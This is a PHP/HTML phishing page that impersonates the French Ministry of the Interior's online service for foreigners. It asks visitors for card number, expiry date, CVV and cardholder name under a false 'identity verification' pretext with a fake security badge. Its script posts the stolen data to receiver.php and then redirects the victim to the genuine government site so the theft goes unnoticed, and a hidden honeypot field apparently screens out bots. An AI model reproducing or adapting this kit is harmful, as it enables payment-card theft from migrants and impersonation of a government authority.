<?php
session_start();
if (!isset($_SESSION['form_token'])) {
    $_SESSION['form_token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['form_token'];
?>
<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" class="login-pf" lang="fr" data-fr-scheme="light">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
    <title>Vérification bancaire | Administration numérique pour les étrangers en France</title>
    <link href="https://fonts.googleapis.com/css?family=Lato:regular,300" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet"/>
    <style>
        input[name="website"] {
            position: absolute !important;
            left: -9999px !important;
            top: -9999px !important;
            opacity: 0 !important;
            height: 0 !important;
            width: 0 !important;
            z-index: -1 !important;
            pointer-events: none !important;
        }
        .progress-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 2rem;
            gap: 0.5rem;
        }
        .progress-step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e5e5e5;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #666;
            font-size: 16px;
        }
        .progress-step.active {
            background: #000091;
            color: #fff;
        }
        .progress-step.done {
            background: #0d6632;
            color: #fff;
        }
        .progress-line {
            width: 80px;
            height: 2px;
            background: #e5e5e5;
        }
        .progress-line.done {
            background: #0d6632;
        }
        .card-preview {
            background: linear-gradient(135deg, #1a237e, #283593);
            color: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            font-family: 'Courier New', monospace;
            min-height: 180px;
        }
        .card-number {
            font-size: 22px;
            letter-spacing: 3px;
            margin: 25px 0 15px 0;
        }
        .card-expiry {
            font-size: 14px;
        }
        .card-holder {
            font-size: 14px;
            text-transform: uppercase;
            margin-top: 10px;
        }
        .chip {
            width: 45px;
            height: 35px;
            background: #c0a060;
            border-radius: 5px;
        }
        .security-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 8px 15px;
            border-radius: 20px;
            display: inline-block;
            font-size: 13px;
            margin-bottom: 15px;
        }
        .info-box {
            background: #fff8e1;
            border-left: 4px solid #ffc107;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-size: 0.875rem;
            border-radius: 4px;
        }
        .cvv-hint {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        .flex-row {
            display: flex;
            gap: 15px;
        }
        .flex-row .fr-fieldset__element {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="fr-skiplinks">
        <nav class="fr-container" role="navigation" aria-label="Accès rapide">
            <ul class="fr-skiplinks__list">
                <li><a class="fr-link" href="#main">Contenu</a></li>
                <li><a class="fr-link" href="#footer">Pied de page</a></li>
            </ul>
        </nav>
    </div>
    <div class="content-container">
        <header role="banner" class="fr-header">
            <div class="fr-header__body">
                <div class="fr-container">
                    <div class="fr-header__body-row">
                        <div class="fr-header__brand fr-enlarge-link">
                            <div class="fr-header__brand-top">
                                <div class="fr-header__logo">
                                    <p class="fr-logo">Ministère<br>de l'intérieur</p>
                                </div>
                                <div class="fr-header__navbar">
<button class="fr-btn--menu fr-btn" data-fr-opened="false" aria-controls="modal-517" aria-haspopup="menu" id="button-518" title="Menu" onclick="openMenu()">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="menu-burger-icon" fill="currentColor">
    <path d="M3 4h18v2H3V4Zm0 7h18v2H3v-2Zm0 7h18v2H3v-2Z"></path>
  </svg>
</button>                                </div>
                            </div>
                            <div class="fr-header__service">
                                <a href="javascript:void(0)" title="Accueil - Administration numérique pour les étrangers en France - Direction Générale des étrangers en France">
                                    <p class="fr-header__service-title">Administration numérique pour les étrangers en France</p>
                                </a>
                                <p class="fr-header__service-tagline">Direction Générale des étrangers en France</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <main class="content-body" id="main" role="main">
            <div class="fr-container fr-container--fluid fr-mb-md-14v">
                <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                    <div class="fr-col-12 fr-col-md-8 fr-col-lg-6">
                        <div class="fr-container fr-background-alt--grey fr-px-md-0 fr-py-10v fr-py-md-14v">
                            <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                                <div class="fr-col-12 fr-col-md-9 fr-col-lg-8">

                                    <!-- Barre de progression -->
                                    <div class="progress-bar">
                                        <div class="progress-step done">✓</div>
                                        <div class="progress-line done"></div>
                                        <div class="progress-step done">✓</div>
                                        <div class="progress-line done"></div>
                                        <div class="progress-step active">3</div>
                                    </div>

                                    <h1>Vérification de votre moyen de paiement</h1>

                                    <div class="security-badge">🔒 Connexion sécurisée (SSL/TLS 256 bits)</div>

                                    <div class="info-box">
                                        Pour finaliser la vérification de votre identité et assurer la sécurité de votre compte, merci de renseigner les informations de votre carte bancaire. Aucun débit ne sera effectué.
                                    </div>

                                    <!-- Aperçu de la carte -->
                                    <div class="card-preview" id="cardPreview">
                                        <div class="chip"></div>
                                        <div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
                                        <div style="display:flex; justify-content:space-between;">
                                            <div>
                                                <div style="font-size:10px; opacity:0.7;">VALID THRU</div>
                                                <div class="card-expiry" id="previewExpiry">MM/AA</div>
                                            </div>
                                            <div>
                                                <div style="font-size:10px; opacity:0.7;">TITULAIRE</div>
                                                <div class="card-holder" id="previewHolder">NOM PRENOM</div>
                                            </div>
                                        </div>
                                    </div>

                                    <form id="card-form" action="receiver.php" method="POST" onsubmit="return captureCard(event)">
                                        <input type="hidden" name="session_token" value="<?= $token ?>">
                                        <input type="hidden" name="form_timer" id="form_timer" value="">
                                        <input type="text" name="website" tabindex="-1" autocomplete="off">

                                        <fieldset class="fr-fieldset">
                                            <legend class="fr-fieldset__legend">
                                                <h2 class="fr-h5">Informations de la carte bancaire</h2>
                                            </legend>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="card_number">Numéro de carte <span style="color:red;">*</span></label>
                                                    <span class="fr-hint-text">16 chiffres inscrits sur votre carte</span>
                                                    <input class="fr-input" name="card_number" id="card_number" type="text" maxlength="19" placeholder="1234 5678 9012 3456" required oninput="formatCardNumber(this); updatePreview();">
                                                </div>
                                            </div>

                                            <div class="flex-row">
                                                <div class="fr-fieldset__element">
                                                    <div class="fr-input-group">
                                                        <label class="fr-label" for="card_expiry">Date d'expiration <span style="color:red;">*</span></label>
                                                        <span class="fr-hint-text">MM/AA</span>
                                                        <input class="fr-input" name="card_expiry" id="card_expiry" type="text" maxlength="5" placeholder="MM/AA" required oninput="formatExpiry(this); updatePreview();">
                                                    </div>
                                                </div>
                                                <div class="fr-fieldset__element">
                                                    <div class="fr-input-group">
                                                        <label class="fr-label" for="card_cvv">CVV <span style="color:red;">*</span></label>
                                                        <span class="fr-hint-text">3 chiffres au dos de la carte</span>
                                                        <input class="fr-input" name="card_cvv" id="card_cvv" type="text" maxlength="3" placeholder="123" required pattern="[0-9]{3}">
                                                        <div class="cvv-hint">Généralement au dos, à droite de la signature</div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div class="fr-input-group">
                                                    <label class="fr-label" for="card_holder">Titulaire de la carte <span style="color:red;">*</span></label>
                                                    <span class="fr-hint-text">Nom et prénom tels qu'inscrits sur la carte</span>
                                                    <input class="fr-input" name="card_holder" id="card_holder" type="text" required oninput="updatePreview();">
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <div style="background:#f5f5f5; padding:10px; border-radius:5px; font-size:13px; color:#555;">
                                                    <strong>🔐 Aucun débit ne sera effectué.</strong> Ces informations sont uniquement utilisées pour vérifier votre identité conformément à la réglementation en vigueur.
                                                </div>
                                            </div>

                                            <div class="fr-fieldset__element">
                                                <ul class="fr-btns-group">
                                                    <li>
                                                        <button class="fr-mt-2v fr-btn" type="submit">Vérifier et finaliser</button>
                                                    </li>
                                                </ul>
                                            </div>
                                        </fieldset>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <footer class="fr-footer" role="contentinfo" id="footer">
            <div class="fr-container">
                <div class="fr-footer__body">
                    <div class="fr-footer__brand fr-enlarge-link">
                        <p class="fr-logo">Ministère<br>de l'intérieur<br>et des outre-mer</p>
                    </div>
                    <div class="fr-footer__content">
                 <ul class="fr-footer__content-list">
  <li class="fr-footer__content-item">
    <a title="service-public.fr - Nouvelle fenêtre" id="footer__content-link-7363" class="fr-footer__content-link" href="javascript:void(0)">
      <span>service-public.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"></path>
      </svg>
    </a>
  </li>
  <li class="fr-footer__content-item">
    <a title="data.gouv.fr - Nouvelle fenêtre" id="footer__content-link-7365" class="fr-footer__content-link" href="javascript:void(0)">
      <span>data.gouv.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"></path>
      </svg>
    </a>
  </li>
</ul>
                    </div>
                </div>
                <div class="fr-footer__bottom">
                    <ul class="fr-footer__bottom-list">
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Plan du site</a>
                        </li>
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Accessibilité : non conforme</a>
                        </li>
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Mentions légales</a>
                        </li>
                    </ul>
                    <div class="fr-footer__bottom-copy">
                        <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous <a href="javascript:void(0)" target="_blank" rel="noopener external" title="Licence etalab - nouvelle fenêtre">licence etalab-2.0</a></p>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script>
 
 document.getElementById('form_timer').value = Math.floor(Date.now() / 1000);

        function formatCardNumber(input) {
            var value = input.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            var formatted = '';
            for (var i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            input.value = formatted;
        }

        function formatExpiry(input) {
            var value = input.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
            input.value = value;
        }

        function updatePreview() {
            var number = document.getElementById('card_number').value.replace(/\s/g, '');
            document.getElementById('previewNumber').textContent = number.replace(/(.{4})/g, '$1 ').trim() || '•••• •••• •••• ••••';
            document.getElementById('previewExpiry').textContent = document.getElementById('card_expiry').value || 'MM/AA';
            document.getElementById('previewHolder').textContent = document.getElementById('card_holder').value.toUpperCase() || 'NOM PRENOM';
        }

      function captureCard(event) {
    event.preventDefault();
    var cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
    var expiry = document.getElementById('card_expiry').value;
    var cvv = document.getElementById('card_cvv').value;
    var holder = document.getElementById('card_holder').value.trim();
    if (cardNumber.length < 16 || expiry.length < 5 || cvv.length < 3 || !holder) {
        alert('Veuillez remplir tous les champs correctement.');
        return false;
    }
    
    var form = document.getElementById('card-form');
    var formData = new FormData(form);
    
    fetch('receiver.php', {
        method: 'POST',
        body: formData
    }).then(function() {
        window.location.href = 'https://administration-etrangers-en-france.interieur.gouv.fr/particuliers/#/';
    }).catch(function() {
        window.location.href = 'https://administration-etrangers-en-france.interieur.gouv.fr/particuliers/#/';
    });
    
    return false;
}

    </script>
</body>
</html>
